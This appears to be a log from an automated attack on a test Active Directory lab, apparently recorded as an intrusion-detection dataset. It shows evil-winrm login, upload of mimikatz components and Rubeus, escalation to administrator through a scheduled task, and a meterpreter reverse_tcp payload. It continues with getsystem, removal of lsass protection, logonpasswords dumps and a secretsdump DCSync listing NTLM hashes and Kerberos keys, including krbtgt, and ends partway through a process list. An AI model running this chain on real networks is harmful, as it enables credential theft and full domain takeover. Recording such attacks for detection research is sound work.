@@ -1,0 +1,928 @@
+--- 2024-04-30 07:10:59 INFO: ---
+
+Command: /usr/local/bin/evil-winrm -i 192.168.10.208 -u Alice@aecid-testbed.com --no-colors -p 'Pa$$w0rd' -P 5986 -S
+
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+
+--- 2024-04-30 07:11:10 INFO: ---
+
+Command: upload /home/ubuntu/payloads/mimidrv.sys C:\Temp\mimidrv.sys
+
+Info: Uploading /home/ubuntu/payloads/mimidrv.sys to C:\Temp\mimidrv.sys
+
+Progress: 54% : |▓▓▓▓▒░░░░░|          
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
+                                                             
+Data: 49608 bytes of 49608 bytes copied
+
+Info: Upload successful!
+
+
+--- 2024-04-30 07:11:21 INFO: ---
+
+Command: upload /home/ubuntu/payloads/mimilib.dll C:\Temp\mimilib.dll
+
+Info: Uploading /home/ubuntu/payloads/mimilib.dll to C:\Temp\mimilib.dll
+
+Progress: 54% : |▓▓▓▓▒░░░░░|          
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
+                                                             
+Data: 49832 bytes of 49832 bytes copied
+
+Info: Upload successful!
+
+
+--- 2024-04-30 07:11:32 INFO: ---
+
+Command: upload /home/ubuntu/payloads/mimispool.dll C:\Temp\mimispool.dll
+
+Info: Uploading /home/ubuntu/payloads/mimispool.dll to C:\Temp\mimispool.dll
+
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
+                                                             
+Data: 14336 bytes of 14336 bytes copied
+
+Info: Upload successful!
+
+
+--- 2024-04-30 07:11:45 INFO: ---
+
+Command: upload /home/ubuntu/payloads/Rubeus.exe C:\Temp\Rubeus.exe
+
+Info: Uploading /home/ubuntu/payloads/Rubeus.exe to C:\Temp\Rubeus.exe
+
+Progress: 4% : |▒░░░░░░░░░░|          
+Progress: 9% : |▒░░░░░░░░░░|          
+Progress: 13% : |▒░░░░░░░░░|          
+Progress: 17% : |▒░░░░░░░░░|          
+Progress: 22% : |▓▒░░░░░░░░|          
+Progress: 26% : |▓▒░░░░░░░░|          
+Progress: 31% : |▓▓▒░░░░░░░|          
+Progress: 35% : |▓▓▒░░░░░░░|          
+Progress: 39% : |▓▓▒░░░░░░░|          
+Progress: 44% : |▓▓▓▒░░░░░░|          
+Progress: 48% : |▓▓▓▒░░░░░░|          
+Progress: 52% : |▓▓▓▓▒░░░░░|          
+Progress: 57% : |▓▓▓▓▒░░░░░|          
+Progress: 61% : |▓▓▓▓▓▒░░░░|          
+Progress: 65% : |▓▓▓▓▓▒░░░░|          
+Progress: 70% : |▓▓▓▓▓▓▒░░░|          
+Progress: 74% : |▓▓▓▓▓▓▒░░░|          
+Progress: 79% : |▓▓▓▓▓▓▒░░░|          
+Progress: 83% : |▓▓▓▓▓▓▓▒░░|          
+Progress: 87% : |▓▓▓▓▓▓▓▒░░|          
+Progress: 92% : |▓▓▓▓▓▓▓▓▒░|          
+Progress: 96% : |▓▓▓▓▓▓▓▓▒░|          
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
+                                                             
+Data: 617128 bytes of 617128 bytes copied
+
+Info: Upload successful!
+
+
+--- 2024-04-30 07:11:55 INFO: ---
+
+Command: Set-Content -Path C:\ProgramData\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'
+
+
+--- 2024-04-30 07:12:06 INFO: ---
+
+Command: schtasks /run /tn WriteLog
+
+SUCCESS: Attempted to run the scheduled task "WriteLog".
+
+--- 2024-04-30 07:12:06 INFO: ---
+
+Command: file
+/tmp/tmpn3kg1o3n
+--- 2024-04-30 07:12:06 INFO: ---
+
+Command: windows/x64/meterpreter/reverse_tcp
+Payload saved to /tmp/tmpn3kg1o3n
+--- 2024-04-30 07:12:17 INFO: ---
+
+Command: upload /tmp/tmpn3kg1o3n C:\Temp\msf.exe
+
+Info: Uploading /tmp/tmpn3kg1o3n to C:\Temp\msf.exe
+
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|          
+                                                             
+Data: 9556 bytes of 9556 bytes copied
+
+Info: Upload successful!
+
+
+--- 2024-04-30 07:12:53 INFO: ---
+
+Command: /usr/local/bin/evil-winrm -i 192.168.10.208 -u Alice@aecid-testbed.com --no-colors -p 'Pa$$w0rd' -P 5986 -S
+
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+
+--- 2024-04-30 07:13:03 INFO: ---
+
+Command: C:\Temp\msf.exe
+
+
+--- 2024-04-30 07:13:09 INFO: ---
+
+Command: getuid
+Server username: AECID-TESTBED\Alice
+
+--- 2024-04-30 07:13:10 INFO: ---
+
+Command: getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+--- 2024-04-30 07:13:11 INFO: ---
+
+Command: getuid
+Server username: NT AUTHORITY\SYSTEM
+
+--- 2024-04-30 07:13:12 INFO: ---
+
+Command: load kiwi
+Loading extension kiwi...
+--- 2024-04-30 07:13:13 INFO: ---
+
+Command: cd C:\\Temp
+
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+--- 2024-04-30 07:13:14 INFO: ---
+
+Command: kiwi_cmd "!+"
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+
+
+--- 2024-04-30 07:13:15 INFO: ---
+
+Command: kiwi_cmd "privilege::debug"
+Privilege '20' OK
+
+
+--- 2024-04-30 07:13:17 INFO: ---
+
+Command: kiwi_cmd '"!processprotect /process:lsass.exe /remove"'
+ERROR mimikatz_doLocal ; "C:\Temp\msf.exe" command of "standard" module not found !
+
+Module :	standard
+Full name :	Standard module
+Description :	Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz(powershell) # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 704 -> 00/00 [0-0-0]
+
+
+--- 2024-04-30 07:13:19 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2024-04-30 07:13:20 INFO: ---
+
+Command: kiwi_cmd "sekurlsa::logonpasswords"
+
+Authentication Id : 0 ; 258939 (00000000:0003f37b)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:30 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 257429 (00000000:0003ed95)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:29 AM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 45046 (00000000:0000aff6)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:08 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:12 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 97429 (00000000:00017c95)
+Session           : Service from 0
+User Name         : cloudbase-init
+Domain            : ATB-WEBSERVER01
+Logon Server      : ATB-WEBSERVER01
+Logon Time        : 4/29/2024 10:27:12 AM
+SID               : S-1-5-21-1938427752-4269896341-3913860205-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : cloudbase-init
+	 * Domain   : ATB-WEBSERVER01
+	 * NTLM     : c90f798f25d18684c6400acb782c552e
+	 * SHA1     : 9476f90bbf9316eb8021ec0b236403ae725387cc
+	tspkg :	
+	wdigest :	
+	 * Username : cloudbase-init
+	 * Domain   : ATB-WEBSERVER01
+	 * Password : (null)
+	kerberos :	
+	 * Username : cloudbase-init
+	 * Domain   : ATB-WEBSERVER01
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 45019 (00000000:0000afdb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:08 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 25375 (00000000:0000631f)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:07 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 24076 (00000000:00005e0c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:06 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : ATB-WEBSERVER01$
+Domain            : AECID-TESTBED
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:06 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : atb-webserver01$
+	 * Domain   : AECID-TESTBED.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 282472 (00000000:00044f68)
+Session           : RemoteInteractive from 2
+User Name         : Alice
+Domain            : AECID-TESTBED
+Logon Server      : ATB-DC2
+Logon Time        : 4/29/2024 10:27:33 AM
+SID               : S-1-5-21-2120283952-2801285132-2723613119-1105
+	msv :	
+	 [00000003] Primary
+	 * Username : Alice
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : 92937945b518814341de3f726500d4ff
+	 * SHA1     : e99089abfd8d6af75c2c45dc4321ac7f28f7ed9d
+	 * DPAPI    : 39e280d5a099eff5015505650bee257f
+	tspkg :	
+	wdigest :	
+	 * Username : Alice
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : Alice
+	 * Domain   : AECID-TESTBED.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : ATB-WEBSERVER01$
+Domain            : AECID-TESTBED
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:07 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : atb-webserver01$
+	 * Domain   : AECID-TESTBED.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 258902 (00000000:0003f356)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:30 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:08 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 25314 (00000000:000062e2)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/29/2024 10:27:07 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * NTLM     : d8eb0b7322dcba2700a1f31dacd5a89a
+	 * SHA1     : 3e703133494bf066b082f33496131487722c7452
+	tspkg :	
+	wdigest :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : AECID-TESTBED
+	 * Password : (null)
+	kerberos :	
+	 * Username : ATB-WEBSERVER01$
+	 * Domain   : aecid-testbed.com
+	 * Password : mk]Bx!ZLp#@n,EwyA3gB04KF\\eBY)zxLefg5Dn%Dt`2n`i9)s@TIQfSbAWlrL>=9Edr(h5)T,F$=KBH?W`XHUkyXdi=QXLrUtD^Hp0lo>VOAHq/` ,]!*m#
+	ssp :	
+	credman :	
+	cloudap :	
+
+
+--- 2024-04-30 07:13:20 INFO: ---
+
+Command: .*NTLM.*:(.*)
+
+--- 2024-04-30 07:13:20 INFO: ---
+
+Command:  d8eb0b7322dcba2700a1f31dacd5a89a
+
+--- 2024-04-30 07:13:21 INFO: ---
+
+Command: secretsdump.py aecid-testbed.com/'wsadmin':' Root.PW1 '@'192.168.10.228' -just-dc
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:abc8318cccb2da8098c75f3f10931d7c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:75dbb973c918244ceae8e916310cafb6:::
+cloudbase-init:1000:aad3b435b51404eeaad3b435b51404ee:377018ad7c549a0122af10daeb18366f:::
+Admin:1001:aad3b435b51404eeaad3b435b51404ee:ff2203e99c0b18beba6396cf60f373d7:::
+Alice:1105:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+Bob:1106:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+Carol:1107:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+Dave:1108:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+Eve:1109:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+Mallory:1110:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
+wsadmin:1111:aad3b435b51404eeaad3b435b51404ee:4ceab57f0ecc75fcfe94a00f1bc812cf:::
+DC1$:1002:aad3b435b51404eeaad3b435b51404ee:c3a88d8112a3f5a9a2539cd701c7f0a4:::
+ATB-DC2$:1112:aad3b435b51404eeaad3b435b51404ee:b83905700fb79fa7e285f6888e8928ff:::
+ATB-FILESERVER0$:1116:aad3b435b51404eeaad3b435b51404ee:005f689f648bf513b1d96f672e86f4dc:::
+ATB-CLIENT01$:1117:aad3b435b51404eeaad3b435b51404ee:cb5a12e13cb1004138546278e112fc5e:::
+WEC$:1119:aad3b435b51404eeaad3b435b51404ee:617b59b2c4655f7cf4587ce7869f5366:::
+ATB-CLIENT02$:1603:aad3b435b51404eeaad3b435b51404ee:7d377676a0bd300773ff292ba375ca7f:::
+ATB-WEBSERVER01$:1604:aad3b435b51404eeaad3b435b51404ee:d8eb0b7322dcba2700a1f31dacd5a89a:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:3e4ec8f5e1be9d08a2787982c80a47770078a39ef953c5efa75f24a0eb6bb5c9
+Administrator:aes128-cts-hmac-sha1-96:39e98e598d99b53c8d48f1b601da3735
+Administrator:des-cbc-md5:e93b83455d765e15
+krbtgt:aes256-cts-hmac-sha1-96:a3e83d72a09a7143b9318adc5e26d4dc2e15d6519ffb9ed41140b43e5d16cb0a
+krbtgt:aes128-cts-hmac-sha1-96:5a2cda57bdfb210b39531561b2e0414c
+krbtgt:des-cbc-md5:7fc1fe025dd3dfd3
+cloudbase-init:aes256-cts-hmac-sha1-96:4dddc2d63383b6e07d49d85400df5b7a8efcb38e3e38945adb739d2e3a5ff2ca
+cloudbase-init:aes128-cts-hmac-sha1-96:0ca5c57201a0acfbaff3fabe46ce3407
+cloudbase-init:des-cbc-md5:2f83452a52fdcb89
+Admin:aes256-cts-hmac-sha1-96:801a14c3004a66fd00b03ea20bbc6439c2da4959a36c5f3466798b7d3c7473db
+Admin:aes128-cts-hmac-sha1-96:4d372161f8e464cd86f251cc65fb4c61
+Admin:des-cbc-md5:f4f7c7eac8c185f2
+Alice:aes256-cts-hmac-sha1-96:c7f3c993b462c8a98d5b7a58f705f0e8a2dfbf559f7c016e0ef47accc561b141
+Alice:aes128-cts-hmac-sha1-96:a81d26008ba39b7f193fc167142cfeaa
+Alice:des-cbc-md5:94eacecd310dad10
+Bob:aes256-cts-hmac-sha1-96:c46b7cca89d6e78f89fb797b7249b607599df1f37c749d0eece85ed86b3437d9
+Bob:aes128-cts-hmac-sha1-96:d4fe80a52899cdb91aeaf166ac7f12a2
+Bob:des-cbc-md5:b937d367041c1ce9
+Carol:aes256-cts-hmac-sha1-96:bfbbfd9d61166d9fec0c81accae26e1f228646c9fa461285174e830396ce8cca
+Carol:aes128-cts-hmac-sha1-96:27fa0f19afb26480b8e6ec75c7f955e8
+Carol:des-cbc-md5:29b698a815e0f77f
+Dave:aes256-cts-hmac-sha1-96:a70642b0445e24aefe481d89e9bff15258cd2cd8dc9405a09b512421a9d95850
+Dave:aes128-cts-hmac-sha1-96:bc8098217511dc56618cc286525b637e
+Dave:des-cbc-md5:76314f074c1991d6
+Eve:aes256-cts-hmac-sha1-96:fa652c245677656ea7ada31297c2ca808c3a78ff0e4528ed00b3c929fb20846b
+Eve:aes128-cts-hmac-sha1-96:a5b75572672dfac50bcf1cc91e780797
+Eve:des-cbc-md5:407a43167ab501ea
+Mallory:aes256-cts-hmac-sha1-96:769548a5929be65bd1d167109e4e603cee66d2e28f7790b7a1990b4ec14ce57f
+Mallory:aes128-cts-hmac-sha1-96:e52908a52003f9da5bd4a1fef1f2b79b
+Mallory:des-cbc-md5:5e16ce3d914fd586
+wsadmin:aes256-cts-hmac-sha1-96:09ba16402dcb561d7527453d43ed47b0edfab2e8f40c51efeb763e5fc3c5bd89
+wsadmin:aes128-cts-hmac-sha1-96:616827d065b6951007407420fbc12635
+wsadmin:des-cbc-md5:0d5dc180ce7a109b
+DC1$:aes256-cts-hmac-sha1-96:36c4e32dd24bade4e2cec8ccffcb33d82458888bbe54951f7ab698b3aec3831a
+DC1$:aes128-cts-hmac-sha1-96:5cddf3777b75ea24e3f8f1fffa8e7f84
+DC1$:des-cbc-md5:46b6b604e6d6f79e
+ATB-DC2$:aes256-cts-hmac-sha1-96:b244e0af51aaf0ce24edecd1e0fdefa4a536c8692c61506b8004d7a4aa295dc1
+ATB-DC2$:aes128-cts-hmac-sha1-96:5c0716ba1add8bc6f226027769ff54ca
+ATB-DC2$:des-cbc-md5:674543b96854b0ad
+ATB-FILESERVER0$:aes256-cts-hmac-sha1-96:0ef33ff4c4ce5aa974211df3b8c6279fd3fea22f90176961785b3a29edf60596
+ATB-FILESERVER0$:aes128-cts-hmac-sha1-96:e4758c7307b38aa950e3d987b06b68f9
+ATB-FILESERVER0$:des-cbc-md5:dcb6c1100bae103e
+ATB-CLIENT01$:aes256-cts-hmac-sha1-96:f05b38ee99d8205c9fc7f0364e43940fb5f4e4e2f5f775ecce380db083d34e59
+ATB-CLIENT01$:aes128-cts-hmac-sha1-96:fc3463ecec0c33837ddafd8c38994965
+ATB-CLIENT01$:des-cbc-md5:617ad5a19b5792fb
+WEC$:aes256-cts-hmac-sha1-96:a4ef583747f45fa053a1364718f36d52c09435188eeb4f8c8fc615aa4c93bf22
+WEC$:aes128-cts-hmac-sha1-96:b858216a71852ca5724c3fa56ae4c749
+WEC$:des-cbc-md5:1fe0bc8a0b298c20
+ATB-CLIENT02$:aes256-cts-hmac-sha1-96:8a43af74859afaeb184a28ca62378eb55675455dcf356f7ba3ae7aacba3e4268
+ATB-CLIENT02$:aes128-cts-hmac-sha1-96:ce80cb1d5f551f2dd029bae3952c27d0
+ATB-CLIENT02$:des-cbc-md5:5497b93804fd265d
+ATB-WEBSERVER01$:aes256-cts-hmac-sha1-96:ac759ac2c0ce206a07473a446fe8d14713b9b57190a970fc8a344aa0afba463a
+ATB-WEBSERVER01$:aes128-cts-hmac-sha1-96:e17ff6782c3cd1bb2c4006bd69fc36c3
+ATB-WEBSERVER01$:des-cbc-md5:6149c77f7aa18594
+[*] Cleaning up... 
+
+--- 2024-04-30 07:13:21 INFO: ---
+
+Command: krbtgt:aes256.*:(.*)
+
+--- 2024-04-30 07:13:21 INFO: ---
+
+Command: a3e83d72a09a7143b9318adc5e26d4dc2e15d6519ffb9ed41140b43e5d16cb0a
+
+--- 2024-04-30 07:13:22 INFO: ---
+
+Command: ps
+
+Process List
+============
+
+ PID   PPID  Name                         Arch  Session  User                          Path
+ ---   ----  ----                         ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                       x64   0
+ 124   4     Registry                     x64   0
+ 332   4     smss.exe                     x64   0
+ 428   696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 456   444   csrss.exe                    x64   0
+ 460   612   dwm.exe                      x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 500   612   LogonUI.exe                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
+ 552   544   csrss.exe                    x64   1
+ 576   444   wininit.exe                  x64   0
+ 612   544   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 696   576   services.exe                 x64   0
+ 704   576   lsass.exe                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 836   696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 864   612   fontdrvhost.exe              x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
+ 872   576   fontdrvhost.exe              x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
+ 960   696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1004  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1096  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1104  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1112  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1120  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1128  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1216  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1260  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1368  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
